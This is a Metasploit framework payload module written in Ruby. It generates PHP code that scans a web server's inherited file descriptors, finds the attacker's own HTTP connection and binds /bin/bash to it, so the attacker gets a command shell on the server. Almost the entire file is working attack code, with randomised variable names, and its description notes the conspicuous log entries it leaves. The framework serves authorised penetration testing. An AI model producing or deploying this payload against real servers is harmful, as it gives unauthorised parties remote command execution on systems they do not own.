##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'PHP Command Shell, Find Sock',
        'Description' => %q{
          Spawn a shell on the established connection to
          the webserver.  Unfortunately, this payload
          can leave conspicuous evil-looking entries in the
          apache error logs, so it is probably a good idea
          to use a bind or reverse shell unless firewalls
          prevent them from working.  The issue this
          payload takes advantage of (CLOEXEC flag not set
          on sockets) appears to have been patched on the
          Ubuntu version of Apache and may not work on
          other Debian-based distributions.  Only tested on
          Apache but it might work on other web servers
          that leak file descriptors to child processes.
        },
        'Author' => [ 'egypt' ],
        'License' => BSD_LICENSE,
        'Platform' => 'php',
        'Handler' => Msf::Handler::FindShell,
        'Session' => Msf::Sessions::CommandShell,
        'Arch' => ARCH_PHP
      )
    )
  end

  def php_findsock
    vars = Rex::RandomIdentifier::Generator.new
    var_cmd = '$' + vars[:var_cmd]
    var_fd = '$' + vars[:var_fd]
    var_out = '$' + vars[:var_out]
    var_dis = '$' + vars[:var_dis]
    shell = <<~END_OF_PHP_CODE
      #{php_preamble(disabled_varname: var_dis)}
      print("<html><body>");
      flush();

      function mysystem(#{var_cmd}){
        #{php_system_block(disabled_varname: var_dis, cmd_varname: var_cmd, output_varname: var_out)}
        return #{var_out};
      }

      #{var_fd} = 13;
      for ($i = 3; $i < 50; $i++) {
        $foo = mysystem("/bin/bash 2>/dev/null <&$i -c 'echo $i'");
        if ($foo != $i) {
          #{var_fd} = $i - 1;
          break;
        }
      }
      print("</body></html>\n\n");
      flush();

      #{var_cmd} = "/bin/bash <&#{var_fd} >&#{var_fd} 2>&#{var_fd}";
      mysystem(#{var_cmd});

    END_OF_PHP_CODE

    return shell
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    return php_findsock
  end
end
